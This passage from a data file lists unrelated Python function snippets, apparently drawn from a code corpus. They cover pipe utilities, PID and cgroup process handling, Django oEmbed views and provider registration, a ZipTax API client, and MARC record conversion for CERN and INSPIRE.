            "def safe_substitute(prev, *args, **kw):\n    '''alias of string.Template.safe_substitute'''\n    template_obj = string.Template(*args, **kw)\n    for data in prev:\n        yield template_obj.safe_substitute(data)"
        ],
        [
            "def to_str(prev, encoding=None):\n    \"\"\"Convert data from previous pipe with specified encoding.\"\"\"\n    first = next(prev)\n    if isinstance(first, str):\n        if encoding is None:\n            yield first\n            for s in prev:\n                yield s\n        else:\n            yield first.encode(encoding)\n            for s in prev:\n                yield s.encode(encoding)\n    else:\n        if encoding is None:\n            encoding = sys.stdout.encoding or 'utf-8'\n        yield first.decode(encoding)\n        for s in prev:\n            yield s.decode(encoding)"
        ],
        [
            "def register_default_types():\n    \"\"\"Regiser all default type-to-pipe convertors.\"\"\"\n    register_type(type, pipe.map)\n    register_type(types.FunctionType, pipe.map)\n    register_type(types.MethodType, pipe.map)\n    register_type(tuple, seq)\n    register_type(list, seq)\n    register_type(types.GeneratorType, seq)\n    register_type(string_type, sh)\n    register_type(unicode_type, sh)\n    register_type(file_type, fileobj)\n\n    if is_py3:\n        register_type(range, seq)\n        register_type(map, seq)"
        ],
        [
            "def get_dict(self):\n        '''\n        Convert Paginator instance to dict\n\n        :return: Paging data\n        :rtype: dict\n        '''\n\n        return dict(\n            current_page=self.current_page,\n            total_page_count=self.total_page_count,\n            items=self.items,\n            total_item_count=self.total_item_count,\n            page_size=self.page_size\n        )"
        ],
        [
            "def check_pidfile(pidfile, debug):\n    \"\"\"Check that a process is not running more than once, using PIDFILE\"\"\"\n    # Check PID exists and see if the PID is running\n    if os.path.isfile(pidfile):\n        pidfile_handle = open(pidfile, 'r')\n        # try and read the PID file. If no luck, remove it\n        try:\n            pid = int(pidfile_handle.read())\n            pidfile_handle.close()\n            if check_pid(pid, debug):\n                return True\n        except:\n            pass\n\n        # PID is not active, remove the PID file\n        os.unlink(pidfile)\n\n    # Create a PID file, to ensure this is script is only run once (at a time)\n    pid = str(os.getpid())\n    open(pidfile, 'w').write(pid)\n    return False"
        ],
        [
            "def check_pid(pid, debug):\n    \"\"\"This function will check whether a PID is currently running\"\"\"\n    try:\n        # A Kill of 0 is to check if the PID is active. It won't kill the process\n        os.kill(pid, 0)\n        if debug > 1:\n            print(\"Script has a PIDFILE where the process is still running\")\n        return True\n    except OSError:\n        if debug > 1:\n            print(\"Script does not appear to be running\")\n        return False"
        ],
        [
            "def disown(debug):\n    \"\"\"This function will disown, so the Ardexa service can be restarted\"\"\"\n    # Get the current PID\n    pid = os.getpid()\n    cgroup_file = \"/proc/\" + str(pid) + \"/cgroup\"\n    try:\n        infile = open(cgroup_file, \"r\")\n    except IOError:\n        print(\"Could not open cgroup file: \", cgroup_file)\n        return False\n\n    # Read each line\n    for line in infile:\n        # Check if the line contains \"ardexa.service\"\n        if line.find(\"ardexa.service\") == -1:\n            continue\n\n        # if the lines contains \"name=\", replace it with nothing\n        line = line.replace(\"name=\", \"\")\n        # Split  the line by commas\n        items_list = line.split(':')\n        accounts = items_list[1]\n        dir_str = accounts + \"/ardexa.disown\"\n        # If accounts is empty, continue\n        if not accounts:\n            continue\n\n        # Create the dir and all subdirs\n        full_dir = \"/sys/fs/cgroup/\" + dir_str\n        if not os.path.exists(full_dir):\n            os.makedirs(full_dir)\n            if debug >= 1:\n                print(\"Making directory: \", full_dir)\n        else:\n            if debug >= 1:\n                print(\"Directory already exists: \", full_dir)\n\n        # Add the PID to the file\n        full_path = full_dir + \"/cgroup.procs\"\n        prog_list = [\"echo\", str(pid), \">\", full_path]\n        run_program(prog_list, debug, True)\n\n        # If this item contains a comma, then separate it, and reverse\n        # some OSes will need cpuacct,cpu reversed to actually work\n        if accounts.find(\",\") != -1:\n            acct_list = accounts.split(',')\n            accounts = acct_list[1] + \",\" + acct_list[0]\n            dir_str = accounts + \"/ardexa.disown\"\n            # Create the dir and all subdirs. But it may not work. So use a TRY\n            full_dir = \"/sys/fs/cgroup/\" + dir_str\n            try:\n                if not os.path.exists(full_dir):\n                    os.makedirs(full_dir)\n            except:\n                continue\n\n            # Add the PID to the file\n            full_path = full_dir + \"/cgroup.procs\"\n            prog_list = [\"echo\", str(pid), \">\", full_path]\n            run_program(prog_list, debug, True)\n\n    infile.close()\n\n    # For debug purposes only\n    if debug >= 1:\n        prog_list = [\"cat\", cgroup_file]\n        run_program(prog_list, debug, False)\n\n    # If there are any \"ardexa.service\" in the proc file. If so, exit with error\n    prog_list = [\"grep\", \"-q\", \"ardexa.service\", cgroup_file]\n    if run_program(prog_list, debug, False):\n        # There are entries still left in the file\n        return False\n\n    return True"
        ],
        [
            "def run_program(prog_list, debug, shell):\n    \"\"\"Run a  program and check program return code Note that some commands don't work\n    well with Popen.  So if this function is specifically called with 'shell=True',\n    then it will run the old 'os.system'. In which case, there is no program output\n    \"\"\"\n    try:\n        if not shell:\n            process = Popen(prog_list, stdout=PIPE, stderr=PIPE)\n            stdout, stderr = process.communicate()\n            retcode = process.returncode\n            if debug >= 1:\n                print(\"Program : \", \" \".join(prog_list))\n                print(\"Return Code: \", retcode)\n                print(\"Stdout: \", stdout)\n                print(\"Stderr: \", stderr)\n            return bool(retcode)\n        else:\n            command = \" \".join(prog_list)\n            os.system(command)\n            return True\n    except:\n        return False"
        ],
        [
            "def parse_address_list(addrs):\n    \"\"\"Yield each integer from a complex range string like \"1-9,12,15-20,23\"\n\n    >>> list(parse_address_list('1-9,12,15-20,23'))\n    [1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 15, 16, 17, 18, 19, 20, 23]\n\n    >>> list(parse_address_list('1-9,12,15-20,2-3-4'))\n    Traceback (most recent call last):\n        ...\n    ValueError: format error in 2-3-4\n    \"\"\"\n    for addr in addrs.split(','):\n        elem = addr.split('-')\n        if len(elem) == 1: # a number\n            yield int(elem[0])\n        elif len(elem) == 2: # a range inclusive\n            start, end = list(map(int, elem))\n            for i in range(start, end+1):\n                yield i\n        else: # more than one hyphen\n            raise ValueError('format error in %s' % addr)"
        ],
        [
            "def _encode_ids(*args):\n    \"\"\"\n    Do url-encode resource ids\n    \"\"\"\n\n    ids = []\n    for v in args:\n        if isinstance(v, basestring):\n            qv = v.encode('utf-8') if isinstance(v, unicode) else v\n            ids.append(urllib.quote(qv))\n        else:\n            qv = str(v)\n            ids.append(urllib.quote(qv))\n\n    return ';'.join(ids)"
        ],
        [
            "def get_item_creator(item_type):\n    \"\"\"Get item creator according registered item type.\n\n    :param item_type: The type of item to be checed.\n    :type item_type: types.TypeType.\n    :returns: Creator function. None if type not found.\n    \"\"\"\n    if item_type not in Pipe.pipe_item_types:\n        for registered_type in Pipe.pipe_item_types:\n            if issubclass(item_type, registered_type):\n                return Pipe.pipe_item_types[registered_type]\n        return None\n    else:\n        return Pipe.pipe_item_types[item_type]"
        ],
        [
            "def clone(self):\n        \"\"\"Self-cloning. All its next Pipe objects are cloned too.\n\n        :returns: cloned object\n        \"\"\"\n        new_object = copy.copy(self)\n        if new_object.next:\n            new_object.next = new_object.next.clone()\n        return new_object"
        ],
        [
            "def append(self, next):\n        \"\"\"Append next object to pipe tail.\n\n        :param next: The Pipe object to be appended to tail.\n        :type next: Pipe object.\n        \"\"\"\n        next.chained = True\n        if self.next:\n            self.next.append(next)\n        else:\n            self.next = next"
        ],
        [
            "def iter(self, prev=None):\n        \"\"\"Return an generator as iterator object.\n\n        :param prev: Previous Pipe object which used for data input.\n        :returns: A generator for iteration.\n        \"\"\"\n\n        if self.next:\n            generator = self.next.iter(self.func(prev, *self.args, **self.kw))\n        else:\n            generator = self.func(prev, *self.args, **self.kw)\n        return generator"
        ],
        [
            "def reduce(func):\n        \"\"\"Wrap a reduce function to Pipe object. Reduce function is a function\n        with at least two arguments. It works like built-in reduce function.\n        It takes first argument for accumulated result, second argument for\n        the new data to process. A keyword-based argument named 'init' is\n        optional. If init is provided, it is used for the initial value of\n        accumulated result. Or, the initial value is None.\n\n        The first argument is the data to be converted. The return data from\n        filter function should be a boolean value. If true, data can pass.\n        Otherwise, data is omitted.\n\n        :param func: The filter function to be wrapped.\n        :type func: function object\n        :param args: The default arguments to be used for filter function.\n        :param kw: The default keyword arguments to be used for filter function.\n        :returns: Pipe object\n        \"\"\"\n        def wrapper(prev, *argv, **kw):\n            accum_value = None if 'init' not in kw else kw.pop('init')\n            if prev is None:\n                raise TypeError('A reducer must have input.')\n            for i in prev:\n                accum_value = func(accum_value, i, *argv, **kw)\n            yield accum_value\n        return Pipe(wrapper)"
        ],
        [
            "def _list_networks():\n    \"\"\"Return a dictionary of network name to active status bools.\n\n        Sample virsh net-list output::\n\n    Name                 State      Autostart\n    -----------------------------------------\n    default              active     yes\n    juju-test            inactive   no\n    foobar               inactive   no\n\n    Parsing the above would return::\n    {\"default\": True, \"juju-test\": False, \"foobar\": False}\n\n    See: http://goo.gl/kXwfC\n    \"\"\"\n    output = core.run(\"virsh net-list --all\")\n    networks = {}\n\n    # Take the header off and normalize whitespace.\n    net_lines = [n.strip() for n in output.splitlines()[2:]]\n    for line in net_lines:\n        if not line:\n            continue\n        name, state, auto = line.split()\n        networks[name] = state == \"active\"\n    return networks"
        ],
        [
            "def flush(self, line):\n        \"\"\"flush the line to stdout\"\"\"\n        # TODO -- maybe use echo?\n        sys.stdout.write(line)\n        sys.stdout.flush()"
        ],
        [
            "def execute(self, arg_str='', **kwargs):\n        \"\"\"runs the passed in arguments and returns an iterator on the output of\n        running command\"\"\"\n        cmd = \"{} {} {}\".format(self.cmd_prefix, self.script, arg_str)\n        expected_ret_code = kwargs.pop('code', 0)\n\n        # any kwargs with all capital letters should be considered environment\n        # variables\n        environ = self.environ\n        for k in list(kwargs.keys()):\n            if k.isupper():\n                environ[k] = kwargs.pop(k)\n\n        # we will allow overriding of these values\n        kwargs.setdefault(\"stderr\", subprocess.STDOUT)\n\n        # we will not allow these to be overridden via kwargs\n        kwargs[\"shell\"] = True\n        kwargs[\"stdout\"] = subprocess.PIPE\n        kwargs[\"cwd\"] = self.cwd\n        kwargs[\"env\"] = environ\n\n        process = None\n        self.buf = deque(maxlen=self.bufsize)\n\n        try:\n            process = subprocess.Popen(\n                cmd,\n                **kwargs\n            )\n\n            # another round of links\n            # http://stackoverflow.com/a/17413045/5006 (what I used)\n            # http://stackoverflow.com/questions/2715847/\n            for line in iter(process.stdout.readline, b\"\"):\n                line = line.decode(self.encoding)\n                self.buf.append(line.rstrip())\n                yield line\n\n            process.wait()\n            if process.returncode != expected_ret_code:\n                if process.returncode > 0:\n                    raise RuntimeError(\"{} returned {} with output: {}\".format(\n                        cmd,\n                        process.returncode,\n                        self.output\n                    ))\n\n        except subprocess.CalledProcessError as e:\n            if e.returncode != expected_ret_code:\n                raise RuntimeError(\"{} returned {} with output: {}\".format(\n                    cmd,\n                    e.returncode,\n                    self.output\n                ))\n\n        finally:\n            if process:\n                process.stdout.close()"
        ],
        [
            "def get_request_subfields(root):\n    \"\"\"Build a basic 035 subfield with basic information from the OAI-PMH request.\n\n    :param root: ElementTree root node\n\n    :return: list of subfield tuples [(..),(..)]\n    \"\"\"\n    request = root.find('request')\n    responsedate = root.find('responseDate')\n\n    subs = [(\"9\", request.text),\n            (\"h\", responsedate.text),\n            (\"m\", request.attrib[\"metadataPrefix\"])]\n    return subs"
        ],
        [
            "def strip_xml_namespace(root):\n    \"\"\"Strip out namespace data from an ElementTree.\n\n    This function is recursive and will traverse all\n    subnodes to the root element\n\n    @param root: the root element\n\n    @return: the same root element, minus namespace\n    \"\"\"\n    try:\n        root.tag = root.tag.split('}')[1]\n    except IndexError:\n        pass\n\n    for element in root.getchildren():\n        strip_xml_namespace(element)"
        ],
        [
            "def load_dict(self, source, namespace=''):\n        \"\"\" Load values from a dictionary structure. Nesting can be used to\n            represent namespaces.\n\n            >>> c = ConfigDict()\n            >>> c.load_dict({'some': {'namespace': {'key': 'value'} } })\n            {'some.namespace.key': 'value'}\n        \"\"\"\n        for key, value in source.items():\n            if isinstance(key, str):\n                nskey = (namespace + '.' + key).strip('.')\n                if isinstance(value, dict):\n                    self.load_dict(value, namespace=nskey)\n                else:\n                    self[nskey] = value\n            else:\n                raise TypeError('Key has type %r (not a string)' % type(key))\n        return self"
        ],
        [
            "def json(request, *args, **kwargs):\n    \"\"\"\n    The oembed endpoint, or the url to which requests for metadata are passed.\n    Third parties will want to access this view with URLs for your site's\n    content and be returned OEmbed metadata.\n    \"\"\"\n    # coerce to dictionary\n    params = dict(request.GET.items())\n    \n    callback = params.pop('callback', None)\n    url = params.pop('url', None)\n    \n    if not url:\n        return HttpResponseBadRequest('Required parameter missing: URL')\n    \n    try:\n        provider = oembed.site.provider_for_url(url)\n        if not provider.provides:\n            raise OEmbedMissingEndpoint()\n    except OEmbedMissingEndpoint:\n        raise Http404('No provider found for %s' % url)\n    \n    query = dict([(smart_str(k), smart_str(v)) for k, v in params.items() if v])\n    \n    try:\n        resource = oembed.site.embed(url, **query)\n    except OEmbedException, e:\n        raise Http404('Error embedding %s: %s' % (url, str(e)))\n\n    response = HttpResponse(mimetype='application/json')\n    json = resource.json\n    \n    if callback:\n        response.write('%s(%s)' % (defaultfilters.force_escape(callback), json))\n    else:\n        response.write(json)\n    \n    return response"
        ],
        [
            "def consume_json(request):\n    \"\"\"\n    Extract and return oembed content for given urls.\n\n    Required GET params:\n        urls - list of urls to consume\n\n    Optional GET params:\n        width - maxwidth attribute for oembed content\n        height - maxheight attribute for oembed content\n        template_dir - template_dir to use when rendering oembed\n\n    Returns:\n        list of dictionaries with oembed metadata and renderings, json encoded\n    \"\"\"\n    client = OEmbedConsumer()\n    \n    urls = request.GET.getlist('urls')\n    width = request.GET.get('width')\n    height = request.GET.get('height')\n    template_dir = request.GET.get('template_dir')\n\n    output = {}\n    ctx = RequestContext(request)\n\n    for url in urls:\n        try:\n            provider = oembed.site.provider_for_url(url)\n        except OEmbedMissingEndpoint:\n            oembeds = None\n            rendered = None\n        else:\n            oembeds = url\n            rendered = client.parse_text(url, width, height, context=ctx, template_dir=template_dir)\n\n        output[url] = {\n            'oembeds': oembeds,\n            'rendered': rendered,\n        }\n\n    return HttpResponse(simplejson.dumps(output), mimetype='application/json')"
        ],
        [
            "def oembed_schema(request):\n    \"\"\"\n    A site profile detailing valid endpoints for a given domain.  Allows for\n    better auto-discovery of embeddable content.\n\n    OEmbed-able content lives at a URL that maps to a provider.\n    \"\"\"\n    current_domain = Site.objects.get_current().domain\n    url_schemes = [] # a list of dictionaries for all the urls we can match\n    endpoint = reverse('oembed_json') # the public endpoint for our oembeds\n    providers = oembed.site.get_providers()\n\n    for provider in providers:\n        # first make sure this provider class is exposed at the public endpoint\n        if not provider.provides:\n            continue\n        \n        match = None\n        if isinstance(provider, DjangoProvider):\n            # django providers define their regex_list by using urlreversing\n            url_pattern = resolver.reverse_dict.get(provider._meta.named_view)\n\n            # this regex replacement is set to be non-greedy, which results\n            # in things like /news/*/*/*/*/ -- this is more explicit\n            if url_pattern:\n                regex = re.sub(r'%\\(.+?\\)s', '*', url_pattern[0][0][0])\n                match = 'http://%s/%s' % (current_domain, regex)\n        elif isinstance(provider, HTTPProvider):\n            match = provider.url_scheme\n        else:\n            match = provider.regex\n\n        if match:\n            url_schemes.append({\n                'type': provider.resource_type,\n                'matches': match,\n                'endpoint': endpoint\n            })\n    \n    url_schemes.sort(key=lambda item: item['matches'])\n    \n    response = HttpResponse(mimetype='application/json')\n    response.write(simplejson.dumps(url_schemes))\n    return response"
        ],
        [
            "def main(path):\n    '''scan path directory and any subdirectories for valid captain scripts'''\n    basepath = os.path.abspath(os.path.expanduser(str(path)))\n\n    echo.h2(\"Available scripts in {}\".format(basepath))\n    echo.br()\n    for root_dir, dirs, files in os.walk(basepath, topdown=True):\n        for f in fnmatch.filter(files, '*.py'):\n            try:\n                filepath = os.path.join(root_dir, f)\n\n                # super edge case, this makes sure the python script won't start\n                # an interactive console session which would cause the session\n                # to start and not allow the for loop to complete\n                with open(filepath, encoding=\"UTF-8\") as fp:\n                    body = fp.read()\n                    is_console = \"InteractiveConsole\" in body\n                    is_console = is_console or \"code\" in body\n                    is_console = is_console and \"interact(\" in body\n                    if is_console:\n                        continue\n\n                s = captain.Script(filepath)\n                if s.can_run_from_cli():\n                    rel_filepath = s.call_path(basepath)\n                    p = s.parser\n\n                    echo.h3(rel_filepath)\n\n                    desc = p.description\n                    if desc:\n                        echo.indent(desc, indent=(\" \" * 4))\n\n                    subcommands = s.subcommands\n                    if subcommands:\n                        echo.br()\n                        echo.indent(\"Subcommands:\", indent=(\" \" * 4))\n                        for sc in subcommands.keys():\n                            echo.indent(sc, indent=(\" \" * 6))\n\n                    echo.br()\n\n            except captain.ParseError:\n                pass\n\n            except Exception as e:\n                #echo.exception(e)\n                #echo.err(\"Failed to parse {} because {}\", f, e.message)\n                echo.err(\"Failed to parse {}\", f)\n                echo.verbose(e.message)\n                echo.br()"
        ],
        [
            "def make_request_data(self, zipcode, city, state):\n        \"\"\" Make the request params given location data \"\"\"\n        data = {'key': self.api_key,\n                'postalcode': str(zipcode),\n                'city': city,\n                'state': state\n        }\n        data = ZipTaxClient._clean_request_data(data)\n        return data"
        ],
        [
            "def process_response(self, resp, multiple_rates):\n        \"\"\" Get the tax rate from the ZipTax response \"\"\"\n        self._check_for_exceptions(resp, multiple_rates)\n\n        rates = {}\n        for result in resp['results']:\n            rate = ZipTaxClient._cast_tax_rate(result['taxSales'])\n            rates[result['geoCity']] = rate\n        if not multiple_rates:\n            return rates[list(rates.keys())[0]]\n        return rates"
        ],
        [
            "def _check_for_exceptions(self, resp, multiple_rates):\n        \"\"\" Check if there are exceptions that should be raised \"\"\"\n        if resp['rCode'] != 100:\n            raise exceptions.get_exception_for_code(resp['rCode'])(resp)\n\n        results = resp['results']\n        if len(results) == 0:\n            raise exceptions.ZipTaxNoResults('No results found')\n        if len(results) > 1 and not multiple_rates:\n            # It's fine if all the taxes are the same\n            rates = [result['taxSales'] for result in results]\n            if len(set(rates)) != 1:\n                raise exceptions.ZipTaxMultipleResults('Multiple results found but requested only one')"
        ],
        [
            "def get_all_text(node):\n    \"\"\"Recursively extract all text from node.\"\"\"\n    if node.nodeType == node.TEXT_NODE:\n        return node.data\n    else:\n        text_string = \"\"\n        for child_node in node.childNodes:\n            text_string += get_all_text(child_node)\n        return text_string"
        ],
        [
            "def register(self, provider_class):\n        \"\"\"\n        Registers a provider with the site.\n        \"\"\"\n        if not issubclass(provider_class, BaseProvider):\n            raise TypeError('%s is not a subclass of BaseProvider' % provider_class.__name__)\n        \n        if provider_class in self._registered_providers:\n            raise AlreadyRegistered('%s is already registered' % provider_class.__name__)\n        \n        if issubclass(provider_class, DjangoProvider):\n            # set up signal handler for cache invalidation\n            signals.post_save.connect(\n                self.invalidate_stored_oembeds,\n                sender=provider_class._meta.model\n            )\n        \n        # don't build the regex yet - if not all urlconfs have been loaded\n        # and processed at this point, the DjangoProvider instances will fail\n        # when attempting to reverse urlpatterns that haven't been created.\n        # Rather, the regex-list will be populated once, on-demand.\n        self._registered_providers.append(provider_class)\n        \n        # flag for re-population\n        self.invalidate_providers()"
        ],
        [
            "def unregister(self, provider_class):\n        \"\"\"\n        Unregisters a provider from the site.\n        \"\"\"\n        if not issubclass(provider_class, BaseProvider):\n            raise TypeError('%s must be a subclass of BaseProvider' % provider_class.__name__)\n        \n        if provider_class not in self._registered_providers:\n            raise NotRegistered('%s is not registered' % provider_class.__name__)\n        \n        self._registered_providers.remove(provider_class)\n        \n        # flag for repopulation\n        self.invalidate_providers()"
        ],
        [
            "def populate(self):\n        \"\"\"\n        Populate the internal registry's dictionary with the regexes for each\n        provider instance\n        \"\"\"\n        self._registry = {}\n        \n        for provider_class in self._registered_providers:\n            instance = provider_class()\n            self._registry[instance] = instance.regex\n        \n        for stored_provider in StoredProvider.objects.active():\n            self._registry[stored_provider] = stored_provider.regex\n        \n        self._populated = True"
        ],
        [
            "def provider_for_url(self, url):\n        \"\"\"\n        Find the right provider for a URL\n        \"\"\"\n        for provider, regex in self.get_registry().items():\n            if re.match(regex, url) is not None:\n                return provider\n        \n        raise OEmbedMissingEndpoint('No endpoint matches URL: %s' % url)"
        ],
        [
            "def invalidate_stored_oembeds(self, sender, instance, created, **kwargs):\n        \"\"\"\n        A hook for django-based oembed providers to delete any stored oembeds\n        \"\"\"\n        ctype = ContentType.objects.get_for_model(instance)\n        StoredOEmbed.objects.filter(\n            object_id=instance.pk,\n            content_type=ctype).delete()"
        ],
        [
            "def embed(self, url, **kwargs):\n        \"\"\"\n        The heart of the matter\n        \"\"\"\n        try:\n            # first figure out the provider\n            provider = self.provider_for_url(url)\n        except OEmbedMissingEndpoint:\n            raise\n        else:\n            try:\n                # check the database for a cached response, because of certain\n                # race conditions that exist with get_or_create(), do a filter\n                # lookup and just grab the first item\n                stored_match = StoredOEmbed.objects.filter(\n                    match=url, \n                    maxwidth=kwargs.get('maxwidth', None), \n                    maxheight=kwargs.get('maxheight', None),\n                    date_expires__gte=datetime.datetime.now())[0]\n                return OEmbedResource.create_json(stored_match.response_json)\n            except IndexError:\n                # query the endpoint and cache response in db\n                # prevent None from being passed in as a GET param\n                params = dict([(k, v) for k, v in kwargs.items() if v])\n                \n                # request an oembed resource for the url\n                resource = provider.request_resource(url, **params)\n                \n                try:\n                    cache_age = int(resource.cache_age)\n                    if cache_age < MIN_OEMBED_TTL:\n                        cache_age = MIN_OEMBED_TTL\n                except:\n                    cache_age = DEFAULT_OEMBED_TTL\n                \n                date_expires = datetime.datetime.now() + datetime.timedelta(seconds=cache_age)\n                \n                stored_oembed, created = StoredOEmbed.objects.get_or_create(\n                    match=url,\n                    maxwidth=kwargs.get('maxwidth', None),\n                    maxheight=kwargs.get('maxheight', None))\n                \n                stored_oembed.response_json = resource.json\n                stored_oembed.resource_type = resource.type\n                stored_oembed.date_expires = date_expires\n                \n                if resource.content_object:\n                    stored_oembed.content_object = resource.content_object\n                \n                stored_oembed.save()\n                return resource"
        ],
        [
            "def autodiscover(self, url):\n        \"\"\"\n        Load up StoredProviders from url if it is an oembed scheme\n        \"\"\"\n        headers, response = fetch_url(url)\n        if headers['content-type'].split(';')[0] in ('application/json', 'text/javascript'):\n            provider_data = json.loads(response)\n            return self.store_providers(provider_data)"
        ],
        [
            "def store_providers(self, provider_data):\n        \"\"\"\n        Iterate over the returned json and try to sort out any new providers\n        \"\"\"\n        if not hasattr(provider_data, '__iter__'):\n            raise OEmbedException('Autodiscovered response not iterable')\n        \n        provider_pks = []\n        \n        for provider in provider_data:\n            if 'endpoint' not in provider or \\\n               'matches' not in provider:\n                continue\n            \n            resource_type = provider.get('type')\n            if resource_type not in RESOURCE_TYPES:\n                continue\n            \n            stored_provider, created = StoredProvider.objects.get_or_create(\n                wildcard_regex=provider['matches']\n            )\n            \n            if created:\n                stored_provider.endpoint_url = relative_to_full(    \n                    provider['endpoint'],\n                    provider['matches']\n                )\n                stored_provider.resource_type = resource_type\n                stored_provider.save()\n            \n            provider_pks.append(stored_provider.pk)\n        \n        return StoredProvider.objects.filter(pk__in=provider_pks)"
        ],
        [
            "def map_attr(self, mapping, attr, obj):\n        \"\"\"\n        A kind of cheesy method that allows for callables or attributes to\n        be used interchangably\n        \"\"\"\n        if attr not in mapping and hasattr(self, attr):\n            if not callable(getattr(self, attr)):\n                mapping[attr] = getattr(self, attr)\n            else:\n                mapping[attr] = getattr(self, attr)(obj)"
        ],
        [
            "def get_image(self, obj):\n        \"\"\"\n        Return an ImageFileField instance\n        \"\"\"\n        if self._meta.image_field:\n            return getattr(obj, self._meta.image_field)"
        ],
        [
            "def map_to_dictionary(self, url, obj, **kwargs):\n        \"\"\"\n        Build a dictionary of metadata for the requested object.\n        \"\"\"\n        maxwidth = kwargs.get('maxwidth', None)\n        maxheight = kwargs.get('maxheight', None)\n        \n        provider_url, provider_name = self.provider_from_url(url)\n        \n        mapping = {\n            'version': '1.0',\n            'url': url,\n            'provider_name': provider_name,\n            'provider_url': provider_url,\n            'type': self.resource_type\n        }\n        \n        # a hook\n        self.preprocess(obj, mapping, **kwargs)\n        \n        # resize image if we have a photo, otherwise use the given maximums\n        if self.resource_type == 'photo' and self.get_image(obj):\n            self.resize_photo(obj, mapping, maxwidth, maxheight)\n        elif self.resource_type in ('video', 'rich', 'photo'):\n            width, height = size_to_nearest(\n                maxwidth,\n                maxheight,\n                self._meta.valid_sizes,\n                self._meta.force_fit\n            )\n            mapping.update(width=width, height=height)\n        \n        # create a thumbnail\n        if self.get_image(obj):\n            self.thumbnail(obj, mapping)\n        \n        # map attributes to the mapping dictionary.  if the attribute is\n        # a callable, it must have an argument signature of\n        # (self, obj)\n        for attr in ('title', 'author_name', 'author_url', 'html'):\n            self.map_attr(mapping, attr, obj)\n        \n        # fix any urls\n        if 'url' in mapping:\n            mapping['url'] = relative_to_full(mapping['url'], url)\n        \n        if 'thumbnail_url' in mapping:\n            mapping['thumbnail_url'] = relative_to_full(mapping['thumbnail_url'], url)\n        \n        if 'html' not in mapping and mapping['type'] in ('video', 'rich'):\n            mapping['html'] = self.render_html(obj, context=Context(mapping))\n        \n        # a hook\n        self.postprocess(obj, mapping, **kwargs)\n        \n        return mapping"
        ],
        [
            "def get_object(self, url, month_format='%b', day_format='%d'):\n        \"\"\"\n        Parses the date from a url and uses it in the query.  For objects which\n        are unique for date.\n        \"\"\"\n        params = self.get_params(url)\n        try:\n            year = params[self._meta.year_part]\n            month = params[self._meta.month_part]\n            day = params[self._meta.day_part]\n        except KeyError:\n            try:\n                # named lookups failed, so try to get the date using the first\n                # three parameters\n                year, month, day = params['_0'], params['_1'], params['_2']\n            except KeyError:\n                raise OEmbedException('Error extracting date from url parameters')\n        \n        try:\n            tt = time.strptime('%s-%s-%s' % (year, month, day),\n                               '%s-%s-%s' % ('%Y', month_format, day_format))\n            date = datetime.date(*tt[:3])\n        except ValueError:\n            raise OEmbedException('Error parsing date from: %s' % url)\n\n        # apply the date-specific lookups\n        if isinstance(self._meta.model._meta.get_field(self._meta.date_field), DateTimeField):\n            min_date = datetime.datetime.combine(date, datetime.time.min)\n            max_date = datetime.datetime.combine(date, datetime.time.max)\n            query = {'%s__range' % self._meta.date_field: (min_date, max_date)}\n        else:\n            query = {self._meta.date_field: date}\n        \n        # apply the regular search lookups\n        for key, value in self._meta.fields_to_match.iteritems():\n            try:\n                query[value] = params[key]\n            except KeyError:\n                raise OEmbedException('%s was not found in the urlpattern parameters.  Valid names are: %s' % (key, ', '.join(params.keys())))\n        \n        try:\n            obj = self.get_queryset().get(**query)\n        except self._meta.model.DoesNotExist:\n            raise OEmbedException('Requested object not found')\n        \n        return obj"
        ],
        [
            "def get_record(self):\n        \"\"\"Override the base.\"\"\"\n        self.recid = self.get_recid()\n        self.remove_controlfields()\n        self.update_system_numbers()\n        self.add_systemnumber(\"Inspire\", recid=self.recid)\n        self.add_control_number(\"003\", \"SzGeCERN\")\n        self.update_collections()\n        self.update_languages()\n        self.update_reportnumbers()\n        self.update_authors()\n        self.update_journals()\n        self.update_subject_categories(\"INSPIRE\", \"SzGeCERN\", \"categories_cds\")\n        self.update_pagenumber()\n        self.update_notes()\n        self.update_experiments()\n        self.update_isbn()\n        self.update_dois()\n        self.update_links_and_ffts()\n        self.update_date()\n        self.update_date_year()\n        self.update_hidden_notes()\n        self.update_oai_info()\n        self.update_cnum()\n        self.update_conference_info()\n\n        self.fields_list = [\n            \"909\", \"541\", \"961\",\n            \"970\", \"690\", \"695\",\n            \"981\",\n        ]\n        self.strip_fields()\n\n        if \"ANNOUNCEMENT\" in self.collections:\n            self.update_conference_111()\n            self.update_conference_links()\n            record_add_field(self.record, \"690\", ind1=\"C\", subfields=[(\"a\", \"CONFERENCE\")])\n\n        if \"THESIS\" in self.collections:\n            self.update_thesis_information()\n            self.update_thesis_supervisors()\n\n        if \"PROCEEDINGS\" in self.collections:\n            # Special proceeding syntax\n            self.update_title_to_proceeding()\n            self.update_author_to_proceeding()\n            record_add_field(self.record, \"690\", ind1=\"C\", subfields=[(\"a\", \"CONFERENCE\")])\n\n        # 690 tags\n        if self.tag_as_cern:\n            record_add_field(self.record, \"690\", ind1=\"C\", subfields=[(\"a\", \"CERN\")])\n\n        return self.record"
        ],
        [
            "def update_oai_info(self):\n        \"\"\"Add the 909 OAI info to 035.\"\"\"\n        for field in record_get_field_instances(self.record, '909', ind1=\"C\", ind2=\"O\"):\n            new_subs = []\n            for tag, value in field[0]:\n                if tag == \"o\":\n                    new_subs.append((\"a\", value))\n                else:\n                    new_subs.append((tag, value))\n                if value in [\"CERN\", \"CDS\", \"ForCDS\"]:\n                    self.tag_as_cern = True\n            record_add_field(self.record, '024', ind1=\"8\", subfields=new_subs)\n        record_delete_fields(self.record, '909')"
        ],
        [
            "def update_cnum(self):\n        \"\"\"Check if we shall add cnum in 035.\"\"\"\n        if \"ConferencePaper\" not in self.collections:\n            cnums = record_get_field_values(self.record, '773', code=\"w\")\n            for cnum in cnums:\n                cnum_subs = [\n                    (\"9\", \"INSPIRE-CNUM\"),\n                    (\"a\", cnum)\n                ]\n                record_add_field(self.record, \"035\", subfields=cnum_subs)"
        ],
        [
            "def update_hidden_notes(self):\n        \"\"\"Remove hidden notes and tag a CERN if detected.\"\"\"\n        if not self.tag_as_cern:\n            notes = record_get_field_instances(self.record,\n                                               tag=\"595\")\n            for field in notes:\n                for dummy, value in field[0]:\n                    if value == \"CDS\":\n                        self.tag_as_cern = True\n        record_delete_fields(self.record, tag=\"595\")"
        ],
        [
